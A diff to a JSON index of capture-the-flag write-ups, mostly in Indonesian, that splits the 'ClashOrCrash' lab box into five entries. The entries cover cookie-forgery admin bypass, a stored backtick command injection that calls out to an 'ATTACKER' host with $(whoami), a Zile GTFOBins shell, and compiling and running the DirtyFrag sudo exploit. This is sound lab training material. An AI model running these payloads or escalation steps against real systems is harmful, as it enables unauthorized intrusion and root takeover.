@@ -2635,71 +2635,240 @@
     "url": ""
   },
   {
-    "id": "hacktrace-clashorcrash",
+    "id": "hacktrace-clashorcrash-bac",
     "date": "2026-06-01",
-    "title": "ClashOrCrash — Broken Access Control, Stored Command Injection & DirtyFrag PrivEsc (Easy, Offensive)",
+    "title": "ClashOrCrash — Broken Access Control: Cookie Forgery Bypass Admin 403 (OWASP A01:2021)",
     "platform": "Hacktrace Ranges",
-    "category": "Offensive Security",
+    "category": "Web Exploitation",
     "tags": [
       "ctf",
-      "offensive-security",
-      "web-exploitation",
-      "command-injection",
-      "privilege-escalation",
       "broken-access-control",
-      "gtfobins",
-      "dirtyfrag",
+      "cookie-forgery",
+      "owasp",
+      "admin-bypass",
+      "web-exploitation",
       "hacktrace",
       "easy"
     ],
     "concepts": [
-      "Broken Access Control via cookie forgery: set admin_login=true cookie untuk bypass HTTP 403 pada admin panel — OWASP Top 10 A01:2021",
-      "Stored Command Injection pattern: injection point bukan receiving endpoint tapi processing endpoint (export.php) yang shell_exec/bash_eval data yang di-store sebelumnya",
-      "Backtick command substitution dalam POST parameter (playertag field) sebagai RCE vector — `whoami` dieksekusi saat export.php memproses stored data",
-      "Crash report analysis untuk identifikasi vulnerable functions (bash_eval, shell_exec) dan trace injection path melalui export.php",
-      "GTFOBins lateral movement: Zile text editor dengan sudo -u barbarian_king untuk spawn shell sebagai user lain via M-x shell-command",
-      "DirtyFrag privilege escalation via SUID sudo binary non-standard path (/opt/sudo-1.9.13p3/bin/sudo)",
-      "TMPDIR=/dev/shm workaround untuk GCC compilation ketika /tmp tidak writable"
+      "Cookie forgery sebagai BAC exploit: set admin_login=true cookie untuk bypass HTTP 403 pada admin panel tanpa credential apapun",
+      "OWASP Top 10 A01:2021 — Broken Access Control: server tidak memvalidasi legitimasi cookie, hanya mengecek keberadaan/nilai field",
+      "Client-controlled data trust: cookie adalah client-controlled, seharusnya keputusan akses tidak bergantung pada nilai cookie yang bisa dimanipulasi user"
     ],
     "terms": [
       "Broken Access Control",
       "OWASP A01:2021",
       "cookie forgery",
       "admin_login=true",
+      "HTTP 403 Forbidden",
+      "client-controlled data",
+      "access control bypass",
+      "session cookie"
+    ],
+    "commands": [
+      "curl -b 'admin_login=true' http://target/admin/",
+      "curl -v -b 'admin_login=true' http://target/admin/ (verbose untuk verify bypass)"
+    ],
+    "problems": [
+      "Admin panel return HTTP 403 Forbidden — bypass via forge cookie admin_login=true tanpa credential apapun",
+      "Identify bahwa access control bergantung pada nilai cookie yang client-controlled, bukan server-side session validation"
+    ],
+    "summary": "Bypass HTTP 403 pada admin panel ClashOrCrash via cookie forgery (admin_login=true). Root cause: server melakukan access control check berdasarkan nilai cookie yang sepenuhnya dikontrol oleh client, bukan server-side session token yang divalidasi. Klasifikasi OWASP A01:2021 Broken Access Control — salah satu kategori kerentanan paling umum di web applications.",
+    "url": "https://drive.google.com/file/d/1hfeO5Z5gveRmi_MGnTr7q8sOg7osc2qh/view?usp=sharing"
+  },
+  {
+    "id": "hacktrace-clashorcrash-stored-cmdi",
+    "date": "2026-06-01",
+    "title": "ClashOrCrash — Stored Command Injection: Backtick RCE via export.php Processing Endpoint",
+    "platform": "Hacktrace Ranges",
+    "category": "Web Exploitation",
+    "tags": [
+      "ctf",
+      "command-injection",
+      "stored-injection",
+      "rce",
+      "shell-exec",
+      "bash-eval",
+      "backtick",
+      "web-exploitation",
+      "hacktrace",
+      "easy"
+    ],
+    "concepts": [
+      "Stored Command Injection pattern: injection point (submit/input endpoint) berbeda dari execution point (export.php processing endpoint) — payload disimpan dulu, baru dieksekusi",
+      "Backtick command substitution sebagai injection vector: `cmd` di dalam string menyebabkan shell mengeksekusi cmd dan substitusi hasilnya",
+      "shell_exec/bash_eval sebagai sink: user input yang di-pass ke fungsi ini tanpa sanitasi menghasilkan RCE",
+      "Blind injection confirmation via OOB callback: karena output tidak tampil langsung di response, gunakan HTTP callback ke listener untuk verifikasi eksekusi"
+    ],
+    "terms": [
       "stored command injection",
       "blind command injection",
       "backtick command substitution",
       "shell_exec",
       "bash_eval",
       "export.php",
-      "crash report analysis",
-      "GTFOBins",
-      "Zile text editor",
-      "M-x shell-command",
-      "DirtyFrag",
-      "SUID sudo",
-      "TMPDIR",
-      "/dev/shm",
-      "lateral movement",
-      "www-data",
-      "barbarian_king"
+      "injection point",
+      "execution point",
+      "sink function",
+      "OOB callback",
+      "out-of-band",
+      "playertag"
     ],
     "commands": [
-      "curl -b 'admin_login=true' http://target/admin/",
-      "curl -X POST -d 'playertag=`curl LISTENER/$(whoami)`' http://target/submit",
+      "curl -X POST -d 'playertag=`curl ATTACKER/$(whoami)`' http://target/submit",
       "curl http://target/export.php",
-      "sudo -u barbarian_king /usr/bin/zile",
-      "M-x shell-command (Zile GTFOBins)",
-      "TMPDIR=/dev/shm ./dirtyfrag"
+      "nc -lvnp 80 (listener untuk tangkap OOB callback)"
     ],
     "problems": [
-      "Admin panel mengembalikan 403 — bypass dengan forge cookie admin_login=true",
-      "Command injection via playertag tidak triggered di endpoint submission — injection hanya dieksekusi saat export.php memproses stored data (stored injection pattern)",
-      "Identifikasi bash_eval dan shell_exec sebagai vulnerable functions dari crash report, bukan dari source code langsung",
-      "Lateral movement dari www-data ke barbarian_king menggunakan Zile editor GTFOBins entry",
-      "GCC compilation gagal karena /tmp tidak writable — workaround dengan TMPDIR=/dev/shm sebelum jalankan DirtyFrag"
+      "Command injection di playertag field tidak triggered saat submit — payload hanya dieksekusi saat export.php diakses, bukan saat input diterima",
+      "Blind injection: output tidak tampil di HTTP response, butuh OOB channel (HTTP callback ke attacker listener) untuk konfirmasi eksekusi",
+      "Identify stored injection pattern vs reflected injection: perlu explore secondary endpoints yang mungkin memproses stored data"
     ],
-    "summary": "Pwn box ClashOrCrash dari Hacktrace Ranges (Easy, Offensive). Attack chain: cookie forgery (admin_login=true) bypass 403 admin panel → stored command injection via backtick substitution di playertag POST parameter, triggered oleh export.php yang bash_eval/shell_exec stored data → initial shell sebagai www-data → lateral movement ke barbarian_king via Zile GTFOBins (sudo -u barbarian_king /usr/bin/zile, shell via M-x shell-command) → privilege escalation ke root via DirtyFrag exploit terhadap SUID sudo binary non-standard (/opt/sudo-1.9.13p3/bin/sudo), dengan TMPDIR=/dev/shm workaround karena /tmp tidak writable. Key learning: stored injection pattern berbeda dari reflected — injection point dan execution point adalah endpoint yang berbeda.",
+    "summary": "RCE pada ClashOrCrash via stored command injection di field playertag — payload backtick (`curl ATTACKER/$(whoami)`) disimpan ke database saat POST ke submit endpoint, kemudian dieksekusi oleh bash_eval/shell_exec ketika export.php memproses data tersebut. Key learning: stored injection berbeda dari reflected — injection point dan execution point adalah endpoint yang berbeda, sehingga payload tidak triggered saat submit tapi saat processing endpoint diakses.",
+    "url": "https://drive.google.com/file/d/1hfeO5Z5gveRmi_MGnTr7q8sOg7osc2qh/view?usp=sharing"
+  },
+  {
+    "id": "hacktrace-clashorcrash-crash-report",
+    "date": "2026-06-01",
+    "title": "ClashOrCrash — Crash Report Analysis: Trace Injection Path via Application Error Logs",
+    "platform": "Hacktrace Ranges",
+    "category": "Web Exploitation",
+    "tags": [
+      "ctf",
+      "crash-report",
+      "information-disclosure",
+      "source-analysis",
+      "bash-eval",
+      "shell-exec",
+      "reconnaissance",
+      "hacktrace",
+      "easy"
+    ],
+    "concepts": [
+      "Crash report sebagai information disclosure: error logs membocorkan function names, call stack, dan code execution path tanpa akses source code",
+      "Identifikasi sink functions (bash_eval, shell_exec) dari stack trace — crash report mengungkap di mana user input di-process secara dangerous",
+      "Trace injection path dari crash log: map bagaimana data mengalir dari input endpoint → storage → processing endpoint (export.php) → sink function"
+    ],
+    "terms": [
+      "crash report",
+      "application error log",
+      "stack trace",
+      "call stack",
+      "bash_eval",
+      "shell_exec",
+      "sink function",
+      "injection path",
+      "information disclosure",
+      "code path analysis"
+    ],
+    "commands": [],
+    "problems": [
+      "Identify vulnerable functions tanpa akses source code — gunakan crash report sebagai proxy untuk understand code execution path",
+      "Trace bagaimana playertag data flows dari submit endpoint ke export.php dan diproses oleh bash_eval"
+    ],
+    "summary": "Analisis crash report ClashOrCrash untuk identifikasi vulnerable functions (bash_eval, shell_exec) dan trace injection path melalui export.php. Crash report membocorkan stack trace yang menunjukkan fungsi-fungsi berbahaya dalam call chain, memungkinkan attacker untuk memahami code execution path tanpa perlu akses ke source code. Teknik ini fundamental dalam black-box web exploitation ketika source code tidak tersedia.",
+    "url": "https://drive.google.com/file/d/1hfeO5Z5gveRmi_MGnTr7q8sOg7osc2qh/view?usp=sharing"
+  },
+  {
+    "id": "hacktrace-clashorcrash-gtfobins-zile",
+    "date": "2026-06-01",
+    "title": "ClashOrCrash — GTFOBins: Zile Text Editor Lateral Movement (www-data → barbarian_king)",
+    "platform": "Hacktrace Ranges",
+    "category": "Privilege Escalation",
+    "tags": [
+      "ctf",
+      "gtfobins",
+      "zile",
+      "lateral-movement",
+      "sudo",
+      "linux",
+      "text-editor-privesc",
+      "hacktrace",
+      "easy"
+    ],
+    "concepts": [
+      "GTFOBins methodology: cari binary yang bisa dijalankan dengan elevated privilege (sudo), check apakah binary tersebut bisa spawn shell atau execute arbitrary commands",
+      "Zile text editor GTFOBins entry: binary emacs-like yang support M-x shell-command untuk execute arbitrary shell commands dari dalam editor",
+      "sudo -u untuk lateral movement: tidak harus ke root, bisa pindah ke user lain — useful untuk access file/permission milik user tertentu",
+      "Lateral movement sebagai stepping stone: www-data → barbarian_king sebagai intermediate step sebelum root escalation"
+    ],
+    "terms": [
+      "GTFOBins",
+      "Zile",
+      "emacs-like keybinding",
+      "M-x shell-command",
+      "sudo -u",
+      "lateral movement",
+      "www-data",
+      "barbarian_king",
+      "text editor privesc",
+      "sudo -l",
+      "allowed commands"
+    ],
+    "commands": [
+      "sudo -l (enumerate allowed sudo commands)",
+      "sudo -u barbarian_king /usr/bin/zile",
+      "M-x shell-command (inside Zile, prefix key)",
+      "/bin/bash -i (command to spawn interactive shell)"
+    ],
+    "problems": [
+      "Identify Zile sebagai GTFOBins candidate dari output sudo -l — perlu familiar dengan GTFOBins database untuk recognize non-obvious binaries",
+      "Navigate Zile interface untuk reach shell-command functionality: M-x adalah prefix key untuk execute named commands di Zile/Emacs-like editors"
+    ],
+    "summary": "Lateral movement dari www-data ke barbarian_king di ClashOrCrash via Zile text editor GTFOBins entry. sudo -l menunjukkan www-data diizinkan jalankan /usr/bin/zile sebagai barbarian_king tanpa password. Dari dalam Zile, M-x shell-command mengeksekusi arbitrary shell commands dalam context user barbarian_king. Key learning: GTFOBins bukan hanya untuk privesc ke root — juga berlaku untuk lateral movement antar user.",
+    "url": "https://drive.google.com/file/d/1hfeO5Z5gveRmi_MGnTr7q8sOg7osc2qh/view?usp=sharing"
+  },
+  {
+    "id": "hacktrace-clashorcrash-dirtyfrag",
+    "date": "2026-06-01",
+    "title": "ClashOrCrash — DirtyFrag: PrivEsc barbarian_king → root via Non-Standard SUID sudo Binary",
+    "platform": "Hacktrace Ranges",
+    "category": "Privilege Escalation",
+    "tags": [
+      "ctf",
+      "dirtyfrag",
+      "privesc",
+      "kernel-exploit",
+      "suid",
+      "sudo",
+      "linux",
+      "gcc",
+      "tmpdir",
+      "hacktrace",
+      "easy"
+    ],
+    "concepts": [
+      "Non-standard SUID binary sebagai attack target: /opt/sudo-1.9.13p3/bin/sudo (path non-default) adalah sudo versi lama yang vulnerable, berbeda dari system sudo /usr/bin/sudo",
+      "DirtyFrag exploit: privilege escalation menargetkan SUID sudo binary versi spesifik — turunan dari exploit class DirtyPipe",
+      "TMPDIR=/dev/shm workaround: ketika /tmp tidak writable (noexec mount atau permission issue), gunakan /dev/shm sebagai tmpfs alternative untuk GCC compilation",
+      "SUID binary enumeration: find / -perm -4000 untuk list semua SUID binaries, perlu cek non-standard path tidak hanya /usr/bin/"
+    ],
+    "terms": [
+      "DirtyFrag",
+      "SUID sudo",
+      "/opt/sudo-1.9.13p3/bin/sudo",
+      "TMPDIR",
+      "/dev/shm",
+      "tmpfs",
+      "GCC compilation",
+      "kernel exploit",
+      "privilege escalation",
+      "SUID binary",
+      "non-standard binary path",
+      "DirtyPipe"
+    ],
+    "commands": [
+      "find / -perm -4000 2>/dev/null (enumerate SUID binaries termasuk non-standard path)",
+      "git clone https://github.com/V4bel/dirtyfrag",
+      "TMPDIR=/dev/shm gcc dirtyfrag.c -o dirtyfrag",
+      "TMPDIR=/dev/shm ./dirtyfrag /opt/sudo-1.9.13p3/bin/sudo"
+    ],
+    "problems": [
+      "Identify non-standard sudo binary di /opt/ sebagai target (bukan /usr/bin/sudo yang biasanya di-patch) — butuh thorough SUID enumeration",
+      "GCC compilation gagal karena /tmp tidak writable — workaround dengan set TMPDIR=/dev/shm sebelum compile dan run DirtyFrag",
+      "Distinguish DirtyFrag target version: exploit hanya work pada sudo versi spesifik yang match dengan binary di /opt/"
+    ],
+    "summary": "Privilege escalation dari barbarian_king ke root di ClashOrCrash via DirtyFrag exploit terhadap SUID sudo binary non-standard di /opt/sudo-1.9.13p3/bin/sudo. SUID enumeration (find / -perm -4000) mengungkap sudo versi lama yang vulnerable di path non-default. DirtyFrag dicompile dengan GCC menggunakan TMPDIR=/dev/shm sebagai workaround karena /tmp tidak writable. Key learning: SUID enumeration harus mencakup seluruh filesystem, bukan hanya /usr/bin/ — custom/legacy binaries di /opt/ sering jadi overlooked attack surface.",
     "url": "https://drive.google.com/file/d/1hfeO5Z5gveRmi_MGnTr7q8sOg7osc2qh/view?usp=sharing"
   }
 ]
